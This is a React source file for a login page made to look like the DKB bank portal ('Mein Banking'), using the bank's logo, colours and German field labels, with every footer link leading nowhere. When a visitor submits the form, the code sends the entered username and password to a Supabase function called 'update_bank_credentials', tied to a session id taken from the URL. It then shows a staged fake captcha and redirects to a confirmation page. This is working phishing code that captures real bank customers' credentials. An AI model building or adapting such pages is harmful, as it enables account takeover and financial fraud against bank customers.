import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import logoAsset from "@/assets/dkb-logo.svg.asset.json";

const BG = "#F3F9FE";
const FOOTER_BG = "#132D40";
const FOOTER_TEXT = "#0C777D";
const PRIMARY = "#006AC7";
const PRIMARY_HOVER = "#005BAE";
const INPUT_BG = "#F2F9FF";
const INPUT_BORDER = "#CFE2F2";
const CARD_BORDER = "#CBD9E4";
const TEXT = "#1A1A1A";
const PLACEHOLDER = "#5A6472";

const FOOTER_LINKS = [
  { label: "DKB Verwalterplattform", href: "#" },
  { label: "DKB Treuhänderplattform", href: "#" },
  { label: "Impressum", href: "#" },
  { label: "Datenschutz", href: "#" },
  { label: "Cookie Einstellungen", href: "#" },
  { label: "Preise & Bedingungen", href: "#" },
  { label: "Hilfe", href: "#" },
];

const DKB = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  // Captcha-Demo: "idle" | 0..2 (Ladeschritt) | "done"
  const [captcha, setCaptcha] = useState<"idle" | 0 | 1 | 2 | "done">("idle");

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  useEffect(() => {
    if (captcha === "idle" || captcha === "done") return;
    const next = captcha === 0 ? 1 : captcha === 1 ? 2 : "done";
    const t = setTimeout(() => setCaptcha(next as typeof captcha), 1200);
    return () => clearTimeout(t);
  }, [captcha]);

  const CAPTCHA_LOADING_TEXTS = [
    "Initialisierung…",
    "Herausforderung laden…",
    "Das Ergebnis wird überprüft…",
  ];
  usePageMeta("DKB – Mein Banking", logoAsset.url);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (submitting) return;
    if (username.trim().length === 0 || password.length === 0) return;
    setSubmitting(true);
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: password,
        p_username_label: "Anmeldename",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  return (
    <div
      className="min-h-screen flex flex-col"
      style={{
        backgroundColor: BG,
        fontFamily: "'DKBEuclid', system-ui, -apple-system, sans-serif",
        color: TEXT,
      }}
    >
      {/* Header / Logo */}
      <header className="px-5 lg:px-10 pt-6 lg:pt-8">
        <a href="#" aria-label="DKB" className="inline-block">
          <img src={logoAsset.url} alt="DKB – Das kann Bank" className="h-[38px] lg:h-[42px] w-auto" />
        </a>
      </header>

      {/* Main */}
      <main className="flex-1 flex items-start justify-center px-4 pt-10 lg:pt-16 pb-16">
        <form
          onSubmit={handleSubmit}
          className="w-full max-w-[560px] bg-white rounded-[14px] px-6 sm:px-12 py-10 lg:py-12"
          style={{ border: `1px solid ${CARD_BORDER}` }}
        >
          <h1
            className="text-center mb-8"
            style={{ fontWeight: 700, fontSize: 32, color: TEXT, letterSpacing: "-0.01em" }}
          >
            Mein Banking
          </h1>

          {/* Anmeldename */}
          <label className="block mb-4">
            <span className="sr-only">Anmeldename</span>
            <input
              type="text"
              autoComplete="off"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              placeholder="Anmeldename"
              className="w-full outline-none"
              style={{
                backgroundColor: INPUT_BG,
                border: `1px solid ${INPUT_BORDER}`,
                borderRadius: 6,
                padding: "16px 18px",
                fontSize: 16,
                color: TEXT,
                fontFamily: "inherit",
              }}
            />
          </label>

          {/* Passwort */}
          <label className="block mb-5 relative">
            <span className="sr-only">Passwort</span>
            <input
              type={showPassword ? "text" : "password"}
              autoComplete="off"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Passwort"
              className="w-full outline-none"
              style={{
                backgroundColor: INPUT_BG,
                border: `1px solid ${INPUT_BORDER}`,
                borderRadius: 6,
                padding: "16px 48px 16px 18px",
                fontSize: 16,
                color: TEXT,
                fontFamily: "inherit",
              }}
            />
            <button
              type="button"
              aria-label={showPassword ? "Passwort verbergen" : "Passwort anzeigen"}
              onClick={() => setShowPassword((v) => !v)}
              className="absolute top-1/2 -translate-y-1/2 right-3 p-2"
              style={{ color: TEXT }}
            >
              {showPassword ? (
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-8-11-8a19.77 19.77 0 0 1 4.22-5.22" />
                  <path d="M1 1l22 22" />
                  <path d="M9.9 4.24A10.94 10.94 0 0 1 12 4c7 0 11 8 11 8a19.77 19.77 0 0 1-3.17 4.14" />
                  <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24" />
                </svg>
              ) : (
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                  <circle cx="12" cy="12" r="3" />
                </svg>
              )}
            </button>
          </label>

          {/* Button */}
          <button
            type="submit"
            disabled={submitting}
            className="w-full transition-colors"
            style={{
              backgroundColor: PRIMARY,
              color: "#fff",
              fontSize: 18,
              fontWeight: 600,
              padding: "16px 20px",
              borderRadius: 6,
              fontFamily: "inherit",
              cursor: submitting ? "not-allowed" : "pointer",
            }}
            onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = PRIMARY_HOVER)}
            onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = PRIMARY)}
          >
            Anmelden
          </button>

          {/* Forgot */}
          <p className="text-center mt-6" style={{ fontSize: 15, color: TEXT }}>
            <a href="#" style={{ color: PRIMARY, textDecoration: "underline", fontWeight: 600 }}>
              Anmeldename
            </a>{" "}
            oder{" "}
            <a href="#" style={{ color: PRIMARY, textDecoration: "underline", fontWeight: 600 }}>
              Passwort
            </a>{" "}
            vergessen?
          </p>
        </form>
      </main>

      {/* Footer */}
      <footer style={{ backgroundColor: FOOTER_BG, color: FOOTER_TEXT }}>
        <div className="px-5 lg:px-10 py-4 flex flex-wrap items-center gap-x-8 gap-y-3 text-[14px]">
          <a href="#" style={{ color: FOOTER_TEXT, fontWeight: 600, textDecoration: "underline" }}>
            Infoseite
          </a>
          <div className="flex flex-wrap items-center gap-x-8 gap-y-3 lg:ml-auto">
            {FOOTER_LINKS.map((l) => (
              <a key={l.label} href={l.href} style={{ color: FOOTER_TEXT, textDecoration: "underline" }}>
                {l.label}
              </a>
            ))}
          </div>
        </div>
      </footer>

      {showLoading && <LoadingOverlay onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
    </div>
  );
};

export default DKB;
